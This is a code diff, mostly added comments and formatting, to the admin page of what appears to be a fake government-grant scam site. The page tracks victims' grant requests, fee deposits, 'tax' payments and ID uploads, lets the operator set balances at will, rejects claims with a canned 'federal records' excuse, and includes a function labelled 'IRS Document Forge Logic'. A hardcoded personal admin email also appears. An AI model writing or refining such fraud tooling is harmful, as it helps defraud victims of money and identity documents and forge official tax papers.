@@ -45,7 +45,9 @@
         </div>
     </header>
 
-    <div class="p-4"><input type="text" id="main-search" placeholder="Search by name, email, or status..." class="w-full h-12 bg-slate-800/50 border border-slate-700 rounded-2xl px-5 text-xs text-white outline-none focus:border-sky-500 transition-all"></div>
+    <div class="p-4">
+        <input type="text" id="main-search" placeholder="Search by name, email, or status..." class="w-full h-12 bg-slate-800/50 border border-slate-700 rounded-2xl px-5 text-xs text-white outline-none focus:border-sky-500 transition-all">
+    </div>
 
     <main class="px-4 space-y-4">
         <div id="pane-users" class="pane active space-y-3"></div>
@@ -178,8 +180,10 @@
     const ADMIN = "liger4683@gmail.com";
     let users = []; let tid = null; let base64 = null;
 
+    // Security Check
     onAuthStateChanged(auth, u => { if(u && u.email === ADMIN) sync(); else window.location.href="login.html"; });
 
+    // Logging Engine
     async function logActivity(targetName, action) {
         await addDoc(collection(db, "logs"), {
             targetUser: targetName,
@@ -188,6 +192,7 @@
         });
     }
 
+    // Task Reversion Logic (The "Undo" Button)
     window.revertTask = async (uid, type, currentStatus, amt) => {
         if(!confirm(`Are you sure you want to set this ${type.toUpperCase()} back to PENDING?`)) return;
         const ref = doc(db, "users", uid);
@@ -195,6 +200,7 @@
         const updateData = {};
         updateData[`${type}Status`] = 'PENDING';
         
+        // Correct Balance if Reverting Successful/Failed states
         if (currentStatus === 'SUCCESSFUL' && (type === 'apply' || type === 'deposit')) {
             updateData.balance = increment(-Number(amt));
         }
@@ -209,6 +215,7 @@
         } catch (e) { alert(e.message); }
     };
 
+    // Real-time Data Sync
     function sync() {
         onSnapshot(collection(db, "users"), snap => {
             users = []; let tC = 0; let mC = 0;
@@ -245,6 +252,7 @@
             render();
         });
 
+        // Logs listener
         onSnapshot(query(collection(db, "logs"), orderBy("timestamp", "desc"), limit(50)), snap => {
             const grid = document.getElementById('full-logs'); grid.innerHTML = "";
             snap.forEach(l => {
@@ -259,6 +267,7 @@
         });
     }
 
+    // UI Rendering
     function render() {
         const q = document.getElementById('main-search').value.toLowerCase();
         const uDiv = document.getElementById('pane-users'); uDiv.innerHTML = "";
@@ -271,6 +280,7 @@
             const email = u.email || "No email";
             if(!name.toLowerCase().includes(q) && !email.toLowerCase().includes(q)) return;
 
+            // Render User Cards
             uDiv.innerHTML += `
             <div class="glass p-4 border-l-4 ${u.kycStatus === 'SUCCESSFUL' ? 'border-emerald-500' : 'border-slate-700'} relative">
                 <div class="flex justify-between items-start mb-4">
@@ -292,6 +302,7 @@
                 </div>
             </div>`;
 
+            // Sort Tasks
             if(['PENDING','UNDER_REVIEW'].includes(u.kycStatus)) tDiv.innerHTML += task(u.id, name, 'ID Verification', [u.idFront, u.idBack], 'kyc', 0);
             if(u.applyStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Grant Request: $${u.requestedAmount}`, null, 'apply', u.requestedAmount);
             if(u.depositStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Deposit Proof: $${u.depositAmount}`, [u.depositProof], 'deposit', u.depositAmount);
@@ -299,6 +310,7 @@
             if(u.withdrawStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, `Disbursement: $${u.withdrawAmount}`, null, 'withdraw', u.withdrawAmount);
             if(u.awardStatus === 'PENDING') tDiv.innerHTML += task(u.id, name, 'Award Claim Request', null, 'award', 0);
 
+            // Render History
             const types = ['kyc', 'apply', 'deposit', 'tax', 'withdraw', 'award'];
             types.forEach(type => {
                 const status = u[`${type}Status`];
@@ -317,6 +329,7 @@
                 }
             });
 
+            // Chat Previews
             if(u.chatHistory?.length) {
                 const last = u.chatHistory[u.chatHistory.length-1];
                 const unread = last.sender === 'USER';
@@ -338,6 +351,7 @@
         });
     }
 
+    // Action Processor
     window.processTask = async (uid, type, status, amt) => {
         let note = status === 'FAILED' ? prompt("REJECTION REASON:", "Documentation inconsistent with federal records.") : "";
         if(status === 'FAILED' && note === null) return;
@@ -347,17 +361,20 @@
         const updateData = {};
         updateData[`${type}Status`] = status;
         if(note) updateData[`${type}Note`] = note;
+        
         if(status === 'SUCCESSFUL') {
             if(type === 'apply' || type === 'deposit') updateData.balance = increment(Number(amt));
             if(type === 'withdraw') updateData.withdrawStatus = 'APPROVED';
         } else if (status === 'FAILED') {
             if(type === 'withdraw') {
-                updateData.balance = increment(Number(amt)); // Refund
+                updateData.balance = increment(Number(amt)); // Refund to user
                 updateData.withdrawStatus = 'REJECTED';
             }
         }
+        
         const ledgerEntry = { id: "TX-" + Date.now(), type: type.toUpperCase(), amount: Number(amt) || 0, status: status, date: new Date().toLocaleDateString(), reason: note || "" };
         updateData.ledger = arrayUnion(ledgerEntry);
+        
         try {
             await updateDoc(userRef, updateData);
             await logActivity(userData.fullName, `${status}: ${type.toUpperCase()} ($${amt})`);
@@ -365,18 +382,24 @@
         } catch (e) { alert(e.message); }
     };
 
+    // Wallet Fund Tool
     window.fund = async (uid) => {
         const v = prompt("Enter amount to adjust (+ to add, - to subtract):");
         if(v && !isNaN(v)) {
             const userRef = doc(db, "users", uid);
             const userDoc = await getDoc(userRef);
-            await updateDoc(userRef, { balance: increment(Number(v)), ledger: arrayUnion({ id: "ADJ-"+Date.now(), type: "ADJUSTMENT", amount: Math.abs(v), status: "SUCCESSFUL", date: new Date().toLocaleDateString(), reason: "Admin Adjustment" }) });
+            await updateDoc(userRef, { 
+                balance: increment(Number(v)), 
+                ledger: arrayUnion({ id: "ADJ-"+Date.now(), type: "ADJUSTMENT", amount: Math.abs(v), status: "SUCCESSFUL", date: new Date().toLocaleDateString(), reason: "Admin Adjustment" }) 
+            });
             await logActivity(userDoc.data().fullName, `FUND ADJUSTMENT: ${v}`);
         }
     };
 
+    // User Deletion
     window.deleteUser = async (uid, name) => { if(confirm(`DELETE ${name}?`)) { await deleteDoc(doc(db, "users", uid)); await logActivity(name, "DELETED CITIZEN"); } };
 
+    // Quick KYC Toggle
     window.vToggle = async (uid, current) => {
         const userDoc = await getDoc(doc(db, "users", uid));
         const status = current === 'SUCCESSFUL' ? 'FAILED' : 'SUCCESSFUL';
@@ -384,6 +407,7 @@
         await logActivity(userDoc.data().fullName, `KYC STATUS -> ${status}`);
     };
 
+    // IRS Document Forge Logic
     window.previewIRS = () => {
         const uid = document.getElementById('forge-user').value;
         const type = document.getElementById('forge-type').value;
@@ -410,6 +434,7 @@
         });
     };
 
+    // Task Component Builder
     function task(uid, name, title, imgs, type, amt) {
         let gallery = imgs ? `<div class="flex gap-2 my-3">` + imgs.map(i => i ? `<img src="${i}" class="w-16 h-16 object-cover rounded-xl" onclick="pop('${i}')">` : '').join('') + `</div>` : '';
         return `<div class="glass p-5 border-l-4 border-amber-500">
@@ -423,6 +448,7 @@
         </div>`;
     }
 
+    // Chat Controller
     window.openChat = (uid, name) => {
         tid = uid; document.getElementById('chat-user').innerText = name; document.getElementById('chat-box').classList.remove('hidden');
         onSnapshot(doc(db, "users", uid), s => {
@@ -443,6 +469,7 @@
         i.value = ""; base64 = null; document.getElementById('pre-img').classList.add('hidden');
     };
 
+    // UI Helpers
     window.go = (id, el) => { 
         document.querySelectorAll('.pane, .nav-item').forEach(x => x.classList.remove('active')); 
         document.getElementById('pane-'+id).classList.add('active'); el.classList.add('active'); 
@@ -455,6 +482,7 @@
         r.readAsDataURL(f.files[0]); 
     };
     window.removePre = () => { base64 = null; document.getElementById('pre-img').classList.add('hidden'); };
+    
     document.getElementById('main-search').oninput = render;
     document.getElementById('logout-btn').onclick = () => signOut(auth);
 </script>
